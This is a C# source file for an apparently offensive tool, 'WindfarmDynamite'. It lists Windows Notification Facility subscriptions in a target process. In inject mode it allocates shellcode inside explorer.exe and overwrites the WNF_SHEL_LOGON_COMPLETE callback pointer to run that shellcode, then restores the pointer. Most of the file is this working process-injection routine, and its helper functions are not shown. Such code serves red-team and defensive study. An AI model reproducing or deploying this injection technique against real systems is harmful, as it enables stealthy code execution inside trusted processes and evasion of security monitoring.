using System;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Collections.Generic;

namespace WindfarmDynamite
{
    class Program
    {
        public static void WnfGetSubscriptionTable(UInt32 ProcId)
        {
            // Validate the process ID
            WNFarmDynamite_h.PROC_VALIDATION pv = WNFarmDynamite_h.ValidateProc((Int32)ProcId);
            Console.WriteLine("[+] Validating Process..", Color.LightGreen);

            // Not what we are looking for
            if (!pv.isvalid || pv.isWow64 || pv.hProc == IntPtr.Zero)
            {
                if (!pv.isvalid)
                {
                    Console.WriteLine("[!] Invalid PID specified..", Color.Red);
                }
                else if (pv.isWow64)
                {
                    Console.WriteLine("[!] Only x64 processes are supported..", Color.Red);
                }
                else
                {
                    Console.WriteLine("[!] Unable to aquire process handle..", Color.Red);
                }
                return;
            }

            // Validation success
            Console.WriteLineFormatted("{0} {4}{1} " + ProcId + "{3} {5}{1} " + pv.sName, Color.White, WNFarmDynamite_h.cProps);
            Console.WriteLineFormatted("    {2} {6}{1} " + pv.hProc + "{3} {7}{1} x64", Color.White, WNFarmDynamite_h.cProps);

            // Look for _WNF_SUBSCRIPTION_TABLE
            Console.WriteLine("\n[+] Leaking local WNF_SUBSCRIPTION_TABLE..", Color.LightGreen);
            WNFarmDynamite_h.WNF_SUBTBL_LEAK WnfTableRVA = WNFarmDynamite_h.LeakWNFSubtRVA();
            if (WnfTableRVA.pNtdll == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to locate Ntdll RVA..", Color.Red);
                return;
            }
            Console.WriteLineFormatted("{0} {8}{1} " + "0x" + String.Format("{0:X}", (WnfTableRVA.pNtdll).ToInt64()) + "{3} {9}{1} " + WnfTableRVA.iNtdllRVA, Color.White, WNFarmDynamite_h.cProps);

            // Read _WNF_SUBSCRIPTION_TABLE in remote proc
            Console.WriteLine("\n[+] Remote WNF_SUBSCRIPTION_TABLE lookup..", Color.LightGreen);
            WNFarmDynamite_h.REMOTE_WNF_SUBTBL rws = WNFarmDynamite_h.VerifyRemoteSubTable(ProcId, pv.hProc, WnfTableRVA.iNtdllRVA);
            if (rws.pNtBase == IntPtr.Zero || rws.pRemoteTbl == IntPtr.Zero || rws.bHasTable == false)
            {
                if (rws.pNtBase == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Unable to get remote Ntdll base..", Color.Red);
                }
                else if (rws.pRemoteTbl == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Unable to read remote table pointer..", Color.Red);
                }
                else
                {
                    Console.WriteLine("[!] Remote process does not have a WNF Subscription table..", Color.Red);
                }
                return;
            }
            Console.WriteLineFormatted("{0} {10}{1} " + "0x" + String.Format("{0:X}", (rws.pNtBase).ToInt64()) + "{3} {11}{1} " + "0x" + String.Format("{0:X}", (rws.pRemoteTbl).ToInt64()), Color.White, WNFarmDynamite_h.cProps);
            Console.WriteLineFormatted("    {2} {12}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Flink).ToInt64()) + "{3} {13}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Blink).ToInt64()), Color.White, WNFarmDynamite_h.cProps);

            // Read process subscriptions
            Console.WriteLine("\n[+] Reading remote WNF subscriptions..", Color.LightGreen);
            List<WNFarmDynamite_h.WNF_SUBSCRIPTION_SET> wss = WNFarmDynamite_h.ReadWnfSubscriptions(pv.hProc, rws.sSubTbl.NamesTableEntry.Flink, rws.sSubTbl.NamesTableEntry.Blink);
            if (wss.Count > 0)
            {
                foreach (WNFarmDynamite_h.WNF_SUBSCRIPTION_SET Subscription in wss)
                {
                    Console.WriteLineFormatted("{0} {14}{1} " + "0x" + String.Format("{0:X}", Subscription.SubscriptionId) + "{3} {15}{1} " + Subscription.StateName, Color.White, WNFarmDynamite_h.cProps);
                    foreach (WNFarmDynamite_h.WNF_USER_SET wus in Subscription.UserSubs)
                    {
                        Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (wus.UserSubscription).ToInt64()), Color.White, WNFarmDynamite_h.cProps);
                        Console.WriteLineFormatted("    {2} {17}{1} " + "0x" + String.Format("{0:X}", (wus.CallBack).ToInt64()) + " {19} " + WNFarmDynamite_h.GetSymForPtr(pv.hProc, wus.CallBack), Color.White, WNFarmDynamite_h.cProps);
                        Console.WriteLineFormatted("    {2} {18}{1} " + "0x" + String.Format("{0:X}", (wus.Context).ToInt64()) + " {19} " + WNFarmDynamite_h.GetSymForPtr(pv.hProc, wus.Context) + "\n", Color.White, WNFarmDynamite_h.cProps);
                    }
                }
            } else
            {
                Console.WriteLine("[!] No WNF subscriptions identified..", Color.Red);
            }
            
        }

        public static void WnfInjectSc()
        {
            // Find main explorer proc
            int ProcId = WNFarmDynamite_h.FindExplorerPID();
            if (ProcId == 0)
            {
                Console.WriteLine("[!] Unable to find explorer process..", Color.Red);
            }

            // Validate the process ID
            WNFarmDynamite_h.PROC_VALIDATION pv = WNFarmDynamite_h.ValidateProc((Int32)ProcId);
            Console.WriteLine("[+] Validating Process..", Color.LightGreen);

            if (!pv.isvalid || pv.isWow64 || pv.hProc == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to get explorer handle..", Color.Red);
                return;
            }

            // Validation success
            Console.WriteLineFormatted("{0} {4}{1} " + ProcId + "{3} {5}{1} " + pv.sName, Color.White, WNFarmDynamite_h.cProps);
            Console.WriteLineFormatted("    {2} {6}{1} " + pv.hProc + "{3} {7}{1} x64", Color.White, WNFarmDynamite_h.cProps);

            // Look for _WNF_SUBSCRIPTION_TABLE
            Console.WriteLine("\n[+] Leaking local WNF_SUBSCRIPTION_TABLE..", Color.LightGreen);
            WNFarmDynamite_h.WNF_SUBTBL_LEAK WnfTableRVA = WNFarmDynamite_h.LeakWNFSubtRVA();
            if (WnfTableRVA.pNtdll == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to locate Ntdll RVA..", Color.Red);
                return;
            }
            Console.WriteLineFormatted("{0} {8}{1} " + "0x" + String.Format("{0:X}", (WnfTableRVA.pNtdll).ToInt64()) + "{3} {9}{1} " + WnfTableRVA.iNtdllRVA, Color.White, WNFarmDynamite_h.cProps);

            // Read _WNF_SUBSCRIPTION_TABLE in remote proc
            Console.WriteLine("\n[+] Remote WNF_SUBSCRIPTION_TABLE lookup..", Color.LightGreen);
            WNFarmDynamite_h.REMOTE_WNF_SUBTBL rws = WNFarmDynamite_h.VerifyRemoteSubTable((uint)ProcId, pv.hProc, WnfTableRVA.iNtdllRVA);
            if (rws.pNtBase == IntPtr.Zero || rws.pRemoteTbl == IntPtr.Zero || rws.bHasTable == false)
            {
                if (rws.pNtBase == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Unable to get remote Ntdll base..", Color.Red);
                }
                else if (rws.pRemoteTbl == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Unable to read remote table pointer..", Color.Red);
                }
                else
                {
                    Console.WriteLine("[!] Remote process does not have a WNF Subscription table..", Color.Red);
                }
                return;
            }
            Console.WriteLineFormatted("{0} {10}{1} " + "0x" + String.Format("{0:X}", (rws.pNtBase).ToInt64()) + "{3} {11}{1} " + "0x" + String.Format("{0:X}", (rws.pRemoteTbl).ToInt64()), Color.White, WNFarmDynamite_h.cProps);
            Console.WriteLineFormatted("    {2} {12}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Flink).ToInt64()) + "{3} {13}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Blink).ToInt64()), Color.White, WNFarmDynamite_h.cProps);

            // Read process subscriptions
            Console.WriteLine("\n[+] Finding remote subscription -> WNF_SHEL_LOGON_COMPLETE", Color.LightGreen);
            WNFarmDynamite_h.WNF_SUBSCRIPTION_SET WnfInjectTarget = new WNFarmDynamite_h.WNF_SUBSCRIPTION_SET();
            List<WNFarmDynamite_h.WNF_SUBSCRIPTION_SET> wss = WNFarmDynamite_h.ReadWnfSubscriptions(pv.hProc, rws.sSubTbl.NamesTableEntry.Flink, rws.sSubTbl.NamesTableEntry.Blink);
            if (wss.Count > 0)
            {
                foreach (WNFarmDynamite_h.WNF_SUBSCRIPTION_SET Subscription in wss)
                {
                    if (Subscription.StateName == "WNF_SHEL_LOGON_COMPLETE")
                    {
                        WnfInjectTarget = Subscription;
                        Console.WriteLineFormatted("{0} {14}{1} " + "0x" + String.Format("{0:X}", Subscription.SubscriptionId) + "{3} {15}{1} " + Subscription.StateName, Color.White, WNFarmDynamite_h.cProps);
                        foreach (WNFarmDynamite_h.WNF_USER_SET wus in Subscription.UserSubs)
                        {
                            Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (wus.UserSubscription).ToInt64()), Color.White, WNFarmDynamite_h.cProps);
                            Console.WriteLineFormatted("    {2} {17}{1} " + "0x" + String.Format("{0:X}", (wus.CallBack).ToInt64()) + " {19} " + WNFarmDynamite_h.GetSymForPtr(pv.hProc, wus.CallBack), Color.White, WNFarmDynamite_h.cProps);
                            Console.WriteLineFormatted("    {2} {18}{1} " + "0x" + String.Format("{0:X}", (wus.Context).ToInt64()) + " {19} " + WNFarmDynamite_h.GetSymForPtr(pv.hProc, wus.Context) + "\n", Color.White, WNFarmDynamite_h.cProps);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[!] Unable to list WNF subscriptions..", Color.Red);
                return;
            }

            // Alloc our payload
            Console.WriteLine("[+] Allocating remote shellcode..", Color.LightGreen);
            WNFarmDynamite_h.SC_ALLOC Payload = WNFarmDynamite_h.RemoteScAlloc(pv.hProc);
            if(Payload.pRemote == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to alloc shellcode in remote process..", Color.Red);
                return;
            }
            Console.WriteLineFormatted("{0} {20}{1} " + Payload.Size, Color.White, WNFarmDynamite_h.cProps);
            Console.WriteLineFormatted("{0} {21}{1} " + "0x" + String.Format("{0:X}", (Payload.pRemote).ToInt64()), Color.White, WNFarmDynamite_h.cProps);

            // Rewrite Callback pointer
            Console.WriteLine("\n[+] Rewriting WNF subscription callback pointer..", Color.LightGreen);
            WNFarmDynamite_h.RewriteSubscriptionPointer(pv.hProc, WnfInjectTarget, Payload.pRemote, false);
            Console.WriteLine("[+] NtUpdateWnfStateData -> Trigger shellcode", Color.LightGreen);
            WNFarmDynamite_h.UpdateWnfState();
            Console.WriteLine("[+] Restoring WNF subscription callback pointer & deallocating shellcode..", Color.LightGreen);
            WNFarmDynamite_h.RewriteSubscriptionPointer(pv.hProc, WnfInjectTarget, Payload.pRemote, true);
        }

        static void Main(string[] args)
        {
            // Print banner
            WNFarmDynamite_h.PrintBanner();

            // Validate args
            if (args.Length == 0)
            {
                Console.WriteLine("\n[!] No arguments given..\n", Color.Red);
                Console.WriteLine("    => -l(--ListWNF) PID    ->    List", Color.LightGreen);
                Console.WriteLine("    => -i(--Inject)         ->    Inject", Color.LightGreen);
            }
            else
            {
                int ListWnf = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(l|ListWNF)$").Match(s).Success);
                int InjectWnf = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);

                if (ListWnf == -1 && InjectWnf == -1)
                {
                    Console.WriteLine("[!] Invalid arguments given..", Color.Red);
                }
                else
                {
                    if (ListWnf != -1)
                    {
                        try
                        {
                            UInt32 Proc = uint.Parse(args[(ListWnf + 1)]);
                            WnfGetSubscriptionTable(Proc);
                        }
                        catch
                        {
                            Console.WriteLine("[!] Missing PID value..", Color.Red);
                            return;
                        }
                    }
                    else
                    {
                        WnfInjectSc();
                    }
                }
            }
        }
    }
}